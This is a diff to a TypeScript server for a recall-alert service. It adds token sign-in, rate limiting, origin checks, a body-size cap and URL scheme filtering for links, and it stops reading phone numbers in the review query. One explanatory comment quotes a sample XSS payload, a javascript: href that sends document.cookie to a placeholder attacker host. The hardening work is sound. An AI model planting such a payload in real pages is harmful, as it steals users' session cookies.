@@ -2,6 +2,10 @@ import { createServer as createHttpServer, type IncomingMessage, type ServerResp
 import type { Db } from './db.js';
 import { rowToRecall } from './ingest.js';
 import { decide } from './matchrun.js';
+import {
+  COOKIE_NAME, RateLimiter, TOKEN_ENV, checkToken, mintSession, originAllowed, parseCookies,
+  readToken, sessionCookie, suggestToken, verifySession,
+} from './auth.js';
 
 /**
  * Two screens, server-rendered, no client JavaScript.
@@ -21,6 +25,26 @@ import { decide } from './matchrun.js';
 function esc(s: string): string {
   return String(s).replace(/[&<>"']/g, (c) =>
     ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' })[c]!);
+}
+
+/**
+ * Escaping is not enough for an href.
+ *
+ * `esc` neutralises the quotes, so a hostile value cannot break out of the attribute -- but
+ * `href="javascript:fetch('//evil.example/'+document.cookie)"` survives escaping intact and
+ * runs on this origin the moment a coordinator clicks "official notice". Recall URLs come from
+ * an upstream feed and are never scheme-checked on ingest, so the check belongs here.
+ *
+ * Anything that is not http(s) returns null and the caller renders inert text instead of a link.
+ */
+export function safeHref(url: string | undefined | null): string | null {
+  if (!url) return null;
+  try {
+    const parsed = new URL(url);
+    return parsed.protocol === 'http:' || parsed.protocol === 'https:' ? parsed.href : null;
+  } catch {
+    return null;
+  }
 }
 
 const STYLE = `
@@ -48,7 +72,7 @@ interface QueueRow {
   match_id: number;
   confidence: string;
   reason: string;
-  phone: string;
+  defer_count: number;
   brand: string | null;
   product: string | null;
   upc: string | null;
@@ -63,17 +87,33 @@ export function pendingCount(db: Db): number {
   return Number(r.c);
 }
 
-/** The next record to decide. One at a time is the point — a list invites skimming. */
+/** How many of the pending records somebody has already looked at and passed on. */
+export function deferredCount(db: Db): number {
+  const r = db.prepare(
+    "SELECT COUNT(*) c FROM matches WHERE confidence = 'candidate' AND decision IS NULL AND deferred_at IS NOT NULL",
+  ).get() as { c: number };
+  return Number(r.c);
+}
+
+/**
+ * The next record to decide. One at a time is the point — a list invites skimming.
+ *
+ * Note what is NOT selected: `s.phone`. The subscribers table is still joined, because a match
+ * belonging to a deleted subscriber must not appear, but the phone number itself never leaves
+ * the database for this screen. Pass 2.2 calls fetching a whole row and letting the view hide
+ * fields a leak, and it is right: the previous version pulled the phone into a row typed
+ * `[k: string]: unknown`, one careless `JSON.stringify(row)` away from publishing it.
+ */
 export function nextForReview(db: Db): QueueRow | undefined {
   return db.prepare(`
-    SELECT m.id AS match_id, m.confidence, m.reason,
-           s.phone, w.brand, w.product, w.upc, w.category, r.*
+    SELECT m.id AS match_id, m.confidence, m.reason, m.defer_count,
+           w.brand, w.product, w.upc, w.category, r.*
     FROM matches m
     JOIN watch_items w ON w.id = m.watch_item_id
     JOIN subscribers s ON s.id = w.subscriber_id
     JOIN recalls r ON r.id = m.recall_id
     WHERE m.confidence = 'candidate' AND m.decision IS NULL
-    ORDER BY (r.severity = 'high') DESC, r.announced_on DESC, m.id
+    ORDER BY (m.deferred_at IS NOT NULL), (r.severity = 'high') DESC, r.announced_on DESC, m.id
     LIMIT 1
   `).get() as QueueRow | undefined;
 }
@@ -90,6 +130,14 @@ export function renderReview(db: Db): string {
        normal state.</p></div>`,
     );
   }
+
+  // A record somebody already passed on says so. Otherwise the second coordinator sees an
+  // apparently fresh candidate, makes the same "can't tell" call, and it circles forever with
+  // nobody aware it is stuck.
+  const passed = Number(row.defer_count) > 0
+    ? `<p class="meta">Passed over ${row.defer_count === 1 ? 'once' : `${row.defer_count} times`} already —
+       if you cannot tell either, it needs someone who can.</p>`
+    : '';
 
   const recall = rowToRecall(row);
   const reason = JSON.parse(row.reason) as { rule: string; detail: string };
@@ -118,6 +166,8 @@ export function renderReview(db: Db): string {
      <h2>Why it was flagged</h2>
      <p class="why">${esc(reason.detail)}<br><span class="meta">rule: ${esc(reason.rule)}</span></p>
 
+     ${passed}
+
      <form method="post" action="/review/${row.match_id}">
        <button class="primary" name="decision" value="alert">Send the alert</button>
        <button name="decision" value="not_a_match">Not a match</button>
@@ -125,7 +175,8 @@ export function renderReview(db: Db): string {
      </form>
 
      <p class="meta">Deciding "send" queues one text. Deciding "not a match" is a bug report about
-     the matcher — those get read.</p>`,
+     the matcher — those get read. "Can't tell" puts it back at the end of the queue for somebody
+     else; it is not a way of clearing it.</p>`,
   );
 }
 
@@ -137,12 +188,13 @@ export function renderPublic(db: Db): string {
   const cards = rows.length
     ? rows.map((r) => {
         const rec = rowToRecall(r);
+        const href = safeHref(rec.url);
         return `<div class="card high">
           <p><strong>${esc(rec.title)}</strong></p>
           <p>${esc(rec.hazard)}</p>
           <p><strong>What to do:</strong> ${esc(rec.remedy || 'See the official notice.')}</p>
           <p class="meta">${esc(rec.source.toUpperCase())} · announced ${esc(rec.announcedOn)}
-            ${rec.url ? `· <a href="${esc(rec.url)}" rel="noopener">official notice</a>` : ''}</p>
+            ${href ? `· <a href="${esc(href)}" rel="noopener noreferrer">official notice</a>` : ''}</p>
         </div>`;
       }).join('')
     : '<div class="empty"><p>No current high-severity recalls on file.</p></div>';
@@ -157,20 +209,139 @@ export function renderPublic(db: Db): string {
   );
 }
 
+/** Bodies here are three short form fields. Anything larger is not a form. */
+const MAX_BODY_BYTES = 8 * 1024;
+
 async function readBody(req: IncomingMessage): Promise<string> {
   const chunks: Buffer[] = [];
-  for await (const c of req) chunks.push(c as Buffer);
+  let size = 0;
+  for await (const c of req) {
+    size += (c as Buffer).length;
+    if (size > MAX_BODY_BYTES) throw new Error('body too large');
+    chunks.push(c as Buffer);
+  }
   return Buffer.concat(chunks).toString('utf8');
 }
 
-export function createServer(db: Db, reviewer = 'coordinator') {
+function renderSignIn(message?: string): string {
+  return page(
+    'Sign in',
+    `<h1>Review queue</h1>
+     ${message ? `<div class="card"><p><strong>${esc(message)}</strong></p></div>` : ''}
+     <p>This screen decides whether a real person gets a text message. It needs the reviewer
+     token.</p>
+     <form method="post" action="/review/sign-in">
+       <label for="token">Reviewer token</label>
+       <input id="token" name="token" type="password" autocomplete="current-password"
+              style="font:inherit;padding:.7rem;min-height:44px;border-radius:8px;border:2px solid #333;flex:1 1 16rem">
+       <button class="primary" type="submit">Sign in</button>
+     </form>`,
+  );
+}
+
+function renderNotConfigured(problem?: string): string {
+  return page(
+    'Review queue unavailable',
+    `<h1>Review queue unavailable</h1>
+     <div class="card high">
+       <p><strong>No reviewer token is set, so this screen will not open.</strong></p>
+       <p>${esc(problem ?? `Set ${TOKEN_ENV} and restart.`)}</p>
+     </div>
+     <p class="meta">This screen sends text messages to people and dismisses recall alerts.
+     Serving it without a credential would let anyone who can reach this port do both, so an
+     unconfigured deployment refuses rather than opening.</p>
+     <p class="meta">Suggested token: <code>${esc(suggestToken())}</code></p>`,
+  );
+}
+
+/**
+ * One shared limiter for the whole process, keyed by client address.
+ *
+ * Thirty decisions a minute is roughly four times the fifteen-second target a human works at, so
+ * a coordinator will never see it; a script walking IDs hits it almost immediately.
+ */
+const DECISION_LIMIT = 30;
+const SIGN_IN_LIMIT = 10;
+const WINDOW_MS = 60_000;
+
+export interface ServerOptions {
+  reviewer?: string;
+  env?: Record<string, string | undefined>;
+  /** Set when the deployment terminates TLS, so the session cookie is marked Secure. */
+  secureCookies?: boolean;
+  now?: () => number;
+}
+
+export function createServer(db: Db, reviewerOrOpts: string | ServerOptions = {}) {
+  const opts: ServerOptions =
+    typeof reviewerOrOpts === 'string' ? { reviewer: reviewerOrOpts } : reviewerOrOpts;
+  const reviewer = opts.reviewer ?? 'coordinator';
+  const tokenState = readToken(opts.env ?? process.env);
+  const now = opts.now ?? Date.now;
+  const decisions = new RateLimiter(DECISION_LIMIT, WINDOW_MS);
+  const signIns = new RateLimiter(SIGN_IN_LIMIT, WINDOW_MS);
+
   return createHttpServer((req: IncomingMessage, res: ServerResponse) => {
     void (async () => {
       const url = new URL(req.url ?? '/', 'http://localhost');
+      const html = (status: number, body: string, headers: Record<string, string> = {}) => {
+        res.writeHead(status, { 'content-type': 'text/html; charset=utf-8', ...headers });
+        res.end(body);
+      };
+      const client = req.socket.remoteAddress ?? 'unknown';
+      const isReview = url.pathname === '/review' || url.pathname.startsWith('/review/');
+
+      // Everything under /review is gated. The public page below is not.
+      if (isReview) {
+        if (!tokenState.configured) {
+          html(503, renderNotConfigured(tokenState.problem));
+          return;
+        }
+
+        if (req.method === 'POST' && url.pathname === '/review/sign-in') {
+          if (!signIns.take(client, now())) {
+            html(429, renderSignIn('Too many attempts. Wait a minute.'), {
+              'retry-after': String(signIns.retryAfterSeconds(client, now())),
+            });
+            return;
+          }
+          const supplied = new URLSearchParams(await readBody(req)).get('token') ?? '';
+          if (!checkToken(supplied, tokenState)) {
+            html(401, renderSignIn('That token was not right.'));
+            return;
+          }
+          res.writeHead(303, {
+            location: '/review',
+            'set-cookie': sessionCookie(mintSession(tokenState.token!, now()), opts.secureCookies ?? false),
+          });
+          res.end();
+          return;
+        }
+
+        const cookies = parseCookies(req.headers.cookie);
+        if (!verifySession(cookies[COOKIE_NAME], tokenState, now())) {
+          html(req.method === 'POST' ? 401 : 200, renderSignIn());
+          return;
+        }
+      }
 
       if (req.method === 'POST') {
         const m = /^\/review\/(\d+)$/.exec(url.pathname);
         if (m) {
+          if (!originAllowed({
+            origin: req.headers.origin as string | undefined,
+            referer: req.headers.referer,
+            host: req.headers.host,
+          })) {
+            html(403, page('Rejected', '<h1>Rejected</h1><p>That request came from another site.</p>'));
+            return;
+          }
+          if (!decisions.take(client, now())) {
+            html(429, page('Slow down', '<h1>Slow down</h1><p>Too many decisions too quickly.</p>'), {
+              'retry-after': String(decisions.retryAfterSeconds(client, now())),
+            });
+            return;
+          }
           const params = new URLSearchParams(await readBody(req));
           const choice = params.get('decision');
           if (choice === 'alert' || choice === 'not_a_match' || choice === 'unclear') {
@@ -184,19 +355,18 @@ export function createServer(db: Db, reviewer = 'coordinator') {
       }
 
       if (url.pathname === '/review') {
-        res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
-        res.end(renderReview(db));
+        html(200, renderReview(db));
         return;
       }
       if (url.pathname === '/') {
-        res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
-        res.end(renderPublic(db));
+        html(200, renderPublic(db));
         return;
       }
 
       res.writeHead(404, { 'content-type': 'text/plain' });
       res.end('not found');
     })().catch(() => {
+      if (res.headersSent) { res.end(); return; }
       res.writeHead(500, { 'content-type': 'text/plain' });
       res.end('error');
     });
